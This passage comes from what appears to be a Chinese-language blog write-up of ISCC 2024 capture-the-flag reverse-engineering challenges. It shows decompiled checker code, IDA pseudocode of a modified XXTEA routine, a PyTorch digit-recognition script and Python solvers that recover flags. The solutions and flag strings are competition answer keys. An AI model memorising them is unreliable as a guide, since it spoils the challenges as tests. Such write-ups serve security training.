class="hljs-number">52</span>)  <br><br>cipher_text = <span class="hljs-string">&#x27;&#x27;</span>  <br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-built_in">len</span>(index)):  <br> cipher_text += <span class="hljs-built_in">chr</span>((key[i] + index[i]))  <br><span class="hljs-built_in">print</span>(cipher_text)<br></code></pre></td></tr></table></figure>

<h4 id="Reverse-AI"><a href="#Reverse-AI" class="headerlink" title="Reverse AI"></a>Reverse AI</h4><p>模型训练，打开附件发现一个 pyc 和一个加密 7z，直接对 Pyc 反编译</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#!/usr/bin/env python</span><br><span class="hljs-comment"># visit https://tool.lu/pyc/ for more information</span><br><span class="hljs-comment"># Version: Python 3.9</span><br><br><span class="hljs-keyword">import</span> base64<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">encrypt_and_compare</span>(<span class="hljs-params">user_input, offset_str, target_base64</span>):<br>    <span class="hljs-keyword">if</span> <span class="hljs-built_in">len</span>(user_input) != <span class="hljs-number">24</span>:<br>        <span class="hljs-keyword">return</span> <span class="hljs-string">&#x27;Please enter a string with a length of 24&#x27;</span><br>    encrypted = <span class="hljs-literal">None</span><br>    <span class="hljs-keyword">for</span> i, char <span class="hljs-keyword">in</span> <span class="hljs-built_in">enumerate</span>(user_input):<br>        offset = <span class="hljs-built_in">int</span>(offset_str[i])<br>        ascii_val = <span class="hljs-built_in">ord</span>(char)<br>        <span class="hljs-keyword">if</span> i % <span class="hljs-number">2</span> == <span class="hljs-number">0</span>:<br>            new_ascii = ascii_val + offset<br>        <span class="hljs-keyword">else</span>:<br>            new_ascii = ascii_val - offset<br>        encrypted_char = <span class="hljs-built_in">chr</span>(new_ascii ^ offset)<br>        encrypted.append(encrypted_char)<br>    encrypted_bytes = <span class="hljs-string">&#x27;&#x27;</span>.join(encrypted).encode(<span class="hljs-string">&#x27;utf-8&#x27;</span>)<br>    encrypted_base64 = base64.b64encode(encrypted_bytes).decode(<span class="hljs-string">&#x27;utf-8&#x27;</span>)<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;Encrypted result:&#123;&#125;&#x27;</span>.<span class="hljs-built_in">format</span>(encrypted_base64))<br>    <span class="hljs-keyword">if</span> encrypted_base64 == target_base64:<br>        <span class="hljs-keyword">return</span> <span class="hljs-string">&#x27;Find key&#x27;</span><br>    <span class="hljs-keyword">return</span> <span class="hljs-literal">None</span><br><br>offset_str = <span class="hljs-string">&#x27;123456789012345678901234&#x27;</span><br>target_base64 = <span class="hljs-string">&#x27;TWF/c1sse19GMW5gYVRoWWFrZ3lhd0B9&#x27;</span><br>user_input = <span class="hljs-built_in">input</span>(<span class="hljs-string">&#x27;Please enter a string with a length of 24:&#x27;</span>)<br>result = encrypt_and_compare(user_input, offset_str, target_base64)<br><span class="hljs-built_in">print</span>(result)<br></code></pre></td></tr></table></figure>

<p>解密得到 Key{Y0u_F1nd_The_key_w@}（解密脚本见 exp1）</p>
<p>得到训练数据和模型参数</p>
<p><img src="../../../../img/archives/2024ISCC05/90ed95aa4aa421ea06da2d7798700fca.jpeg" srcset="/img/loading.gif" lazyload></p>
<p><img src="../../../../img/archives/2024ISCC05/ca5c107500f1d82947d6f5b57f64d8a8.png" srcset="/img/loading.gif" lazyload> 循环遍历 24 张图片，对图片进行处理，并使用模型进行训练（代码见 exp2），训练后得到一串数字，使用其作为对照表密码进行解密（应该是解密成功则训练的结果正确），得到对照表，对照后得出 flag</p>
<p>W@CFW@K1K_Cd_SSSCF@nd_Fd_CSSSa! K1</p>
<p>Exp1</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> base64  <br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">decrypt</span>(<span class="hljs-params">encrypted_base64, offset_str</span>):  <br> encrypted_bytes = base64.b64decode(encrypted_base64.encode(<span class="hljs-string">&#x27;utf-8&#x27;</span>))  <br> encrypted = encrypted_bytes.decode(<span class="hljs-string">&#x27;utf-8&#x27;</span>)  <br> decrypted = []  <br> <span class="hljs-keyword">for</span> i, char <span class="hljs-keyword">in</span> <span class="hljs-built_in">enumerate</span>(encrypted):  <br> offset = <span class="hljs-built_in">int</span>(offset_str[i])  <br> new_ascii = <span class="hljs-built_in">ord</span>(char) \^ offset  <br> <span class="hljs-keyword">if</span> i % <span class="hljs-number">2</span> == <span class="hljs-number">0</span>:  <br> ascii_val = new_ascii - offset  <br> <span class="hljs-keyword">else</span>:  <br> ascii_val = new_ascii + offset  <br> decrypted_char = <span class="hljs-built_in">chr</span>(ascii_val)  <br> decrypted.append(decrypted_char)  <br> <span class="hljs-keyword">return</span> <span class="hljs-string">&#x27;&#x27;</span>.join(decrypted)  <br><br>offset_str = <span class="hljs-string">&#x27;123456789012345678901234&#x27;</span>  <br>target_base64 = <span class="hljs-string">&#x27;TWF/c1sse19GMW5gYVRoWWFrZ3lhd0B9&#x27;</span>  <br><br>decrypted_text = decrypt(target_base64, offset_str)  <br><span class="hljs-built_in">print</span>(decrypted_text)<br></code></pre></td></tr></table></figure>

<p>exp2</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> torch  <br><span class="hljs-keyword">import</span> torch.nn <span class="hljs-keyword">as</span> nn  <br><span class="hljs-keyword">import</span> torch.nn.functional <span class="hljs-keyword">as</span> F  <br><span class="hljs-keyword">import</span> torchvision.transforms <span class="hljs-keyword">as</span> transforms  <br><span class="hljs-keyword">from</span> PIL <span class="hljs-keyword">import</span> Image  <br><br><span class="hljs-keyword">class</span> <span class="hljs-title class_">Net</span>(nn.Module):  <br> <span class="hljs-keyword">def</span> \__init__(<span class="hljs-variable language_">self</span>):  <br> <span class="hljs-built_in">super</span>(Net, <span class="hljs-variable language_">self</span>).__init__()  <br> <span class="hljs-variable language_">self</span>.fc1 = nn.Linear(<span class="hljs-number">28</span> \* <span class="hljs-number">28</span>, <span class="hljs-number">128</span>)  <br> <span class="hljs-variable language_">self</span>.fc2 = nn.Linear(<span class="hljs-number">128</span>, <span class="hljs-number">64</span>)  <br> <span class="hljs-variable language_">self</span>.fc3 = nn.Linear(<span class="hljs-number">64</span>, <span class="hljs-number">10</span>)  <br><br> <span class="hljs-keyword">def</span> <span class="hljs-title function_">forward</span>(<span class="hljs-params">self, x</span>):  <br> x = x.view(-<span class="hljs-number">1</span>, <span class="hljs-number">28</span> \* <span class="hljs-number">28</span>)  <br> x = F.relu(<span class="hljs-variable language_">self</span>.fc1(x))  <br> x = F.relu(<span class="hljs-variable language_">self</span>.fc2(x))  <br> x = <span class="hljs-variable language_">self</span>.fc3(x)  <br> <span class="hljs-keyword">return</span> x  <br><br>model = torch.load(<span class="hljs-string">&quot;confused_digit_recognition_model.pt&quot;</span>)  <br>model.<span class="hljs-built_in">eval</span>()  <br><br>transform = transforms.Compose(  <br> [  <br> transforms.Grayscale(num_output_channels=<span class="hljs-number">1</span>),  <br> transforms.Resize((<span class="hljs-number">28</span>, <span class="hljs-number">28</span>)),  <br> transforms.ToTensor(),  <br> transforms.Normalize((<span class="hljs-number">0.5</span>,), (<span class="hljs-number">0.5</span>,)),  <br> ]  <br>)  <br><br>results = []  <br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">1</span>, <span class="hljs-number">25</span>):  <br> image = Image.<span class="hljs-built_in">open</span>(<span class="hljs-string">f&quot;<span class="hljs-subst">&#123;i&#125;</span>.png&quot;</span>)  <br> processed_image = transform(image).unsqueeze(<span class="hljs-number">0</span>)  <br> prediction = model(processed_image)  <br> predicted_digit = torch.argmax(prediction, dim=<span class="hljs-number">1</span>).item()  <br> results.append(predicted_digit)  <br><br>output_string = <span class="hljs-string">&quot;&quot;</span>.join(<span class="hljs-built_in">str</span>(digit) <span class="hljs-keyword">for</span> digit <span class="hljs-keyword">in</span> results)  <br><span class="hljs-built_in">print</span>(output_string)<br></code></pre></td></tr></table></figure>

<h4 id="Reverse-Badcode"><a href="#Reverse-Badcode" class="headerlink" title="Reverse Badcode"></a>Reverse Badcode</h4><p>IDA 反编译，分析伪代码发现是魔改的 XXTEA</p>
<figure class="highlight smali"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br></pre></td><td class="code"><pre><code class="hljs smali">int __cdecl main(int argc,<span class="hljs-built_in"> const </span>char **argv,<span class="hljs-built_in"> const </span>char **envp)<br>&#123;<br> <span class="hljs-built_in"> int </span>v3; // eax<br> <span class="hljs-built_in"> int </span>v4; // esi<br> <span class="hljs-built_in"> int </span>v5; // eax<br> <span class="hljs-built_in"> int </span>v6; // eax<br>  char v8; // bl<br>  char v9; // bl<br>  char v10; // bl<br> <span class="hljs-built_in"> int </span>*v11; // eax<br> <span class="hljs-built_in"> int </span>v12; // eax<br> <span class="hljs-built_in"> int </span>i; // [esp+1Ch] [ebp-84h]<br>  unsigned<span class="hljs-built_in"> int </span>k; // [esp+20h] [ebp-80h]<br>  unsigned<span class="hljs-built_in"> int </span>j; // [esp+28h] [ebp-78h]<br>  char v16[24]; // [esp+2Ch] [ebp-74h] BYREF<br>  char v17[24]; // [esp+44h] [ebp-5Ch] BYREF<br> <span class="hljs-built_in"> int </span>v18; // [esp+5Ch] [ebp-44h]<br> <span class="hljs-built_in"> int </span>Buf2[6]; // [esp+60h] [ebp-40h] BYREF<br> <span class="hljs-built_in"> int </span>Buf1[6]; // [esp+78h] [ebp-28h] BYREF<br> <span class="hljs-built_in"> int </span>v21; // [esp+9Ch] [ebp-4h]<br><br>  sub_401C10(v17);<br>  v21 = 0;<br>  sub_4023F0(std::cout, <span class="hljs-string">&quot;Enter a 24-length string: &quot;</span>);<br>  sub_402730(std::cin, v17);<br>  v3 = rand();<br>  v18 = sub_4016F0(v3 % 100);<br>  for ( i = 0; i &lt; 100; ++i )<br>  &#123;<br>    v4 = sub_4016F0(i + v18);<br>    v18 = v4 - sub_4016F0(i);<br>  &#125;<br> <span class="hljs-built_in"> if </span>( v18 == 123456 )<br>  &#123;<br>    v5 = sub_4023F0(std::cout, <span class="hljs-string">&quot;This will never happen.&quot;</span>);<br>    std::ostream::operator&lt;&lt;(v5, sub_402750);<br>  &#125;<br> <span class="hljs-built_in"> if </span>( unknown_libname_3(v17) == 24 )<br>  &#123;<br>    for ( j = 0; j &lt; unknown_libname_3(v17); ++j )<br>    &#123;<br>     <span class="hljs-built_in"> if </span>( (int)j % 2 )<br>        v8 = *(_BYTE *)sub_401B60(j) + 2;<br>      else<br>        v8 = *(_BYTE *)sub_401B60(j) - 3;<br>      *(_BYTE *)sub_401B60(j) = v8;<br>    &#125;<br>    sub_401620(v16);<br>    LOBYTE(v21) = 1;<br>    for ( k = 0; k &lt; unknown_libname_3(v17); ++k )<br>    &#123;<br>      v9 = *(_BYTE *)sub_401B60(k);<br>      v10 = (*(_BYTE *)sub_401B60(k) - 48) ^ v9;<br>      *(_BYTE *)sub_401B60(k) = v10;<br>    &#125;<br>    v11 = (int *)sub_401B40(v17);<br>    Buf1[0] = *v11;<br>    Buf1[1] = v11[1];<br>    Buf1[2] = v11[2];<br>    Buf1[3] = v11[3];<br>    Buf1[4] = v11[4];<br>    Buf1[5] = v11[5];<br>    sub_4014C0(Buf1, 6, &amp;unk_407018);<br>    Buf2[0] = -1397788020;<br>    Buf2[1] = 1332517737;<br>    Buf2[2] = 1765424146;<br>    Buf2[3] = 1527938651;<br>    Buf2[4] = -257500227;<br>    Buf2[5] = 1585408511;<br>   <span class="hljs-built_in"> if </span>( !memcmp(Buf1, Buf2, 0x18u) )<br>      v12 = sub_4023F0(std::cout, <span class="hljs-string">&quot;Flag found!&quot;</span>);<br>    else<br>      v12 = sub_4023F0(std::cout, <span class="hljs-string">&quot;Flag not found.&quot;</span>);<br>    std::ostream::operator&lt;&lt;(v12, sub_402750);<br>   <span class="hljs-keyword"> system</span>(<span class="hljs-string">&quot;pause&quot;</span>);<br>    LOBYTE(v21) = 0;<br>    std::string::~string(v16);<br>    v21 = -1;<br>    std::string::~string(v17);<br>   <span class="hljs-built_in"> return </span>0;<br>  &#125;<br>  else<br>  &#123;<br>    v6 = sub_4023F0(std::cout, <span class="hljs-string">&quot;Input must be 24 characters long.&quot;</span>);<br>    std::ostream::operator&lt;&lt;(v6, sub_402750);<br>    v21 = -1;<br>    std::string::~string(v17);<br>   <span class="hljs-built_in"> return </span>1;<br>  &#125;<br>&#125;<br></code></pre></td></tr></table></figure>

<p>IDA 动调去拿 main 的 v9 异或值，然后编写脚本逆向解密</p>
<p><img src="../../../../img/archives/2024ISCC05/8e1553e8ba6aeb5a7a403e1211eb781f.png" srcset="/img/loading.gif" lazyload></p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> Crypto.Util.number <span class="hljs-keyword">import</span> *<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">_speck_round</span>(<span class="hljs-params">z, y, x, key, p, e</span>):<br>    <span class="hljs-keyword">return</span> ((((z &gt;&gt; <span class="hljs-number">5</span>) ^ (y &lt;&lt; <span class="hljs-number">2</span>)) + ((y &gt;&gt; <span class="hljs-number">3</span>) ^ (z &lt;&lt; <span class="hljs-number">4</span>))) ^ ((x ^ y) + (key[(p &amp; <span class="hljs-number">3</span>) ^ e] ^ z)))<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">_speck_process</span>(<span class="hljs-params">data, key, delta, rounds, block_size, mode</span>):<br>    x = <span class="hljs-number">0</span> <span class="hljs-keyword">if</span> mode == <span class="hljs-number">1</span> <span class="hljs-keyword">else</span> (<span class="hljs-number">0</span> - rounds * delta) &amp; <span class="hljs-number">0xFFFFFFFF</span><br>    <span class="hljs-keyword">if</span> mode == <span class="hljs-number">1</span>:<br>        z = data[block_size - <span class="hljs-number">1</span>]<br>        <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(rounds):<br>            x = (x - delta) &amp; <span class="hljs-number">0xFFFFFFFF</span><br>            e = (x &gt;&gt; <span class="hljs-number">2</span>) &amp; <span class="hljs-number">3</span><br>            <span class="hljs-keyword">for</span> p <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(block_size - <span class="hljs-number">1</span>):<br>                y = data[p + <span class="hljs-number">1</span>]<br>                data[p] = (data[p] + _speck_round(z, y, x, key, p, e)) &amp; <span class="hljs-number">0xFFFFFFFF</span><br>                z = data[p]<br>            y = data[<span class="hljs-number">0</span>]<br>            data[block_size - <span class="hljs-number">1</span>] = (data[block_size - <span class="hljs-number">1</span>] + _speck_round(z, y, x, key, block_size - <span class="hljs-number">1</span>, e)) &amp; <span class="hljs-number">0xFFFFFFFF</span><br>            z = data[block_size - <span class="hljs-number">1</span>]<br>    <span class="hljs-keyword">else</span>:<br>        y = data[<span class="hljs-number">0</span>]<br>        <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(rounds):<br>            e = (x &gt;&gt; <span class="hljs-number">2</span>) &amp; <span class="hljs-number">3</span><br>            <span class="hljs-keyword">for</span> p <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(block_size - <span class="hljs-number">1</span>, <span class="hljs-number">0</span>, -<span class="hljs-number">1</span>):<br>                z = data[p - <span class="hljs-number">1</span>]<br>                data[p] = (data[p] - _speck_round(z, y, x, key, p, e)) &amp; <span class="hljs-number">0xFFFFFFFF</span><br>                y = data[p]<br>            z = data[block_size - <span class="hljs-number">1</span>]<br>            data[<span class="hljs-number">0</span>] = (data[<span class="hljs-number">0</span>] - _speck_round(z, y, x, key, <span class="hljs-number">0</span>, e)) &amp; <span class="hljs-number">0xFFFFFFFF</span><br>            y = data[<span class="hljs-number">0</span>]<br>            x = (x + delta) &amp; <span class="hljs-number">0xFFFFFFFF</span><br>    <span class="hljs-keyword">return</span> data<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">_speck_encrypt</span>(<span class="hljs-params">data, key</span>):<br>    delta = <span class="hljs-number">0x61C88647</span><br>    block_size = <span class="hljs-built_in">len</span>(data)<br>    rounds = <span class="hljs-number">6</span> + <span class="hljs-number">52</span> // block_size<br>    <span class="hljs-keyword">return</span> _speck_process(data, key, delta, rounds, block_size, <span class="hljs-number">1</span>)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">_speck_decrypt</span>(<span class="hljs-params">data, key</span>):<br>    delta = <span class="hljs-number">0x61C88647</span><br>    block_size = <span class="hljs-built_in">len</span>(data)<br>    rounds = <span class="hljs-number">6</span> + <span class="hljs-number">52</span> // block_size<br>    <span class="hljs-keyword">return</span> _speck_process(data, key, delta, rounds, block_size, -<span class="hljs-number">1</span>)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">_recover_data</span>(<span class="hljs-params">decrypted, secret</span>):<br>    result = []<br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-built_in">len</span>(decrypted)):<br>        x = long_to_bytes(decrypted[i])<br>        <span class="hljs-keyword">for</span> j <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">3</span>, -<span class="hljs-number">1</span>, -<span class="hljs-number">1</span>):<br>            result.append(x[j])<br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-built_in">len</span>(result)):<br>        result[i] ^= <span class="hljs-built_in">ord</span>(secret[i]) - <span class="hljs-number">0x30</span><br>        result[i] = result[i] - <span class="hljs-number">2</span> <span class="hljs-keyword">if</span> i % <span class="hljs-number">2</span> <span class="hljs-keyword">else</span> result[i] + <span class="hljs-number">3</span><br>    <span class="hljs-keyword">return</span> <span class="hljs-built_in">bytes</span>(result).decode()<br></code></pre></td></tr></table></figure>

<h4 id="Reverse-CrypticConundrum"><a href="#Reverse-CrypticConundrum" class="headerlink" title="Reverse CrypticConundrum"></a>Reverse CrypticConundrum</h4><p><img src="../../../../img/archives/2024ISCC05/f948f297247c9d221b2bdf2b16f2a2a7.png" srcset="/img/loading.gif" lazyload></p>
<p><img src="../../../../img/archives/2024ISCC05/6e8ba9ebe50964de1016cbbe29aa3a38.png" srcset="/img/loading.gif" lazyload></p>
<p>查壳脱壳</p>
<p>ida 反编译程序，对伪代码进行分析。Main 函数接收用户输入的 flag，检查其长度是否合法。如果长度合法，则调用 mix 和 Encryption 函数对 flag 进行处理。最后，将加密后的 flag 与预期结果进行比较，判断用户输入的 flag 是否正确。mix 函数主要是对用户输入的 flag 和正确的 flag 进行一系列复杂的混合操作，最终将用户输入的 flag 复制回 a1。NewEncryption 函数首先，将 a1 中每个字符的值减去 a2 中对应字符的值（循环取模）。然后，反转 a1 的前半部分。Encryption 函数调用 NewEncryption 函数进行初步加密。然后，对初步加密后的 flag 进行一系列操作，包括反转、异或、相减和加 10 等。</p>
<p>编写脚本进行解密</p>
<p><img src="../../../../img/archives/2024ISCC05/4260c397f017515d42700b8163daa85d.png" srcset="/img/loading.gif" lazyload></p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> Crypto.Util.number <span class="hljs-keyword">import</span> *<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">custom_decrypt</span>(<span class="hljs-params">cmp, key1, key2</span>):<br>    cmp = <span class="hljs-built_in">list</span>(cmp)<br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-built_in">len</span>(cmp)):<br>        cmp[i] -= <span class="hljs-number">10</span><br>        cmp[i] &amp;= <span class="hljs-number">0xff</span><br><br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-built_in">len</span>(cmp) - <span class="hljs-number">1</span>):<br>        cmp[i] += cmp[i + <span class="hljs-number">1</span>]<br>        cmp[i] &amp;= <span class="hljs-number">0xff</span><br><br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-built_in">len</span>(cmp) - <span class="hljs-number">1</span>):<br>        cmp[i] ^= <span class="hljs-built_in">ord</span>(key2[<span class="hljs-number">2</span>])<br><br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">0</span>, <span class="hljs-built_in">len</span>(cmp), <span class="hljs-number">2</span>):<br>        cmp[i] ^= <span class="hljs-built_in">ord</span>(key2[i % <span class="hljs-number">4</span>])<br><br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-built_in">len</span>(cmp) // <span class="hljs-number">2</span>):<br>        cmp[i], cmp[<span class="hljs-number">26</span> - i - <span class="hljs-number">1</span>] = cmp[<span class="hljs-number">26</span> - i - <span class="hljs-number">1</span>], cmp[i]<br><br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-built_in">len</span>(cmp) // <span class="hljs-number">2</span>):<br>        cmp[i], cmp[<span class="hljs-number">26</span> - i - <span class="hljs-number">1</span>] = cmp[<span class="hljs-number">26</span> - i - <span class="hljs-number">1</span>], cmp[i]<br><br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-built_in">len</span>(cmp)):<br>        cmp[i] += <span class="hljs-built_in">ord</span>(key2[i % <span class="hljs-number">4</span>])<br>        cmp[i] &amp;= <span class="hljs-number">0xff</span><br><br>    <span class="hljs-keyword">return</span> <span class="hljs-built_in">bytes</span>(cmp)<br><br>cmp = <span class="hljs-built_in">list</span>(long_to_bytes(<span class="hljs-number">0xF54734183FD5829C</span>))[::-<span class="hljs-number">1</span>]<br>cmp += <span class="hljs-built_in">list</span>(long_to_bytes(<span class="hljs-number">0x87BFE73481A6BD85</span>))[::-<span class="hljs-number">1</span>]<br>cmp += <span class="hljs-built_in">list</span>(long_to_bytes(<span class="hljs-number">0xC93D70B9D1790140</span>))[<span class="hljs-number">2</span>:][::-<span class="hljs-number">1</span>]<br>cmp += <span class="hljs-built_in">list</span>(long_to_bytes(<span class="hljs-number">0x34B2C93D</span>))[::-<span class="hljs-number">1</span>]<br><br>key1 = <span class="hljs-string">&#x27;So--this-is-the-right-flag&#x27;</span><br>key1_ = []<br>key2 = <span class="hljs-string">&#x27;ISCC&#x27;</span><br><br>decrypted_data = custom_decrypt(cmp, key1, key2)<br><span class="hljs-built_in">print</span>(decrypted_data)<br></code></pre></td></tr></table></figure>

<h4 id="Reverse-Find-All"><a href="#Reverse-Find-All" class="headerlink" title="Reverse Find_All"></a>Reverse Find_All</h4><p><img src="../../../../img/archives/2024ISCC05/9098c25d2c366dec166b279001fbcf0c.png" srcset="/img/loading.gif" lazyload> 打开程序发现是 wasd，感觉像是小游戏</p>
<p>Ida 反编译分析发现</p>
